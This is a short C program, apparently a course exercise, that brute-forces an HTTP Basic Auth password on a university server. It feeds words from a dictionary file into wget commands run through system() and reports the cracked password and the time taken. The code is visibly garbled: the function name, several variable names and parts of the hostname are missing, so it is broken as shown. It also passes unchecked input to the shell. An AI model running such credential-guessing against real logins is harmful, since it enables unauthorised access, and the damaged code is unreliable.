









#include<stdio.h>
#include<stdlib.h>
#include<sys/types.h>
#include<sys/times.h>
#include<sys/time.h>
#include<unistd.h>
#include<strings.h>
int ()
{
  char url[100];
  char syscom[]= "wget -nv --http-user= --http-passwd=";
  char http[] = "http://sec-crack.cs.rmit.edu./SEC/2/ ";
  FILE *fp;

  char pass[15], *valid;
  valid = "pass";
  int , end, time_var;
  int hack =1;
  int attempt =1;

  fp = fopen("words.txt","r");
  if (fp == NULL)
  exit(1);

   = time();
  while (valid != NULL)
  {
   valid  = fgets(pass,15,fp);
   pass[strlen(pass)-1] ='\0';

   if(strlen(pass) != 3)
   continue;

   printf("%s\n",pass);
   sprintf(url,"%s%s %s",syscom,pass,http);

   hack = system(url);
   attempt++;

   if (hack == 0)
    {
     end = time();
     time_var = (end-);
     printf("\nThe password is :%s",pass);
     printf("\nNo. of Attempts   crack the password :%d",attempt);
     printf("\nTime taken  crack the password = %lld sec\n",time_var/1000000000);
     exit(1);
     }
   }
  exit(1);
 }

